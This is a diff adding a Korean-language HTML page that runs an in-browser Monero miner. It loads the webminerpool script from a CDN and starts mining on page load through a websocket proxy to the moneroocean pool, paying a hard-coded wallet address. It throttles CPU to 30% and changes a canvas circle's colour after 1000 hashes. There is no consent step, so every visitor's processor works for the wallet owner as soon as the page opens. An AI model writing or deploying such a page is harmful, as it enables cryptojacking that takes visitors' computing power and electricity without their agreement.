@@ -1,0 +1,57 @@
+```html
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>모네로 채굴 및 원 색상 변경</title>
+</head>
+<body>
+    <h1>모네로 채굴 웹페이지</h1>
+    <p>채굴이 성공적으로 진행되면 원이 빨간색에서 초록색으로 바뀝니다.</p>
+    <canvas id="myCanvas" width="200" height="200" style="border:1px solid #000;"></canvas>
+
+    <!-- webminerpool 클라이언트 스크립트 -->
+    <script src="https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/sdk/webmr.js"></script>
+    <script>
+        // 캔버스와 컨텍스트 가져오기
+        const canvas = document.getElementById('myCanvas');
+        const ctx = canvas.getContext('2d');
+
+        // 원 그리기 함수
+        function drawCircle(color) {
+            ctx.clearRect(0, 0, canvas.width, canvas.height); // 캔버스 초기화
+            ctx.beginPath();
+            ctx.arc(100, 100, 50, 0, 2 * Math.PI); // 원(중심: 100,100, 반지름: 50)
+            ctx.fillStyle = color;
+            ctx.fill();
+            ctx.closePath();
+        }
+
+        // 초기 상태: 빨간 원
+        drawCircle('red');
+
+        // 모네로 채굴 설정
+        server = "wss://minexmr.stream:8181"; // webminerpool 프록시 서버
+        startMining(
+            "moneroocean.stream", // 마이닝 풀
+            "42uPLifaPuT1a9ZAsekfSk1WufupQELmNecGPTtvsJ6t9ZVyw4MadYe6xXVkR2BXabA3KD6zLNUfW7e9TNqCSGF3Ta39b5e", // 실제 모네로 지갑 주소로 교체
+            "web-miner-001", // 작업자 ID
+            -1, // 스레드 수 (자동)
+            "" // 비밀번호 (없으면 공백)
+        );
+        throttleMiner = 30; // CPU 사용량 30%로 제한
+
+        // 채굴 상태 모니터링 및 색상 변경
+        setInterval(function() {
+            if (typeof getHashesPerSecond !== 'undefined') {
+                var totalHashes = getTotalHashes();
+                console.log("총 해시: " + totalHashes);
+                if (totalHashes >= 1000) { // 1000 해시 도달 시 색상 변경
+                    drawCircle('green');
+                }
+            }
+        }, 5000); // 5초마다 상태 확인
+    </script>
+</body>
+</html>
+```
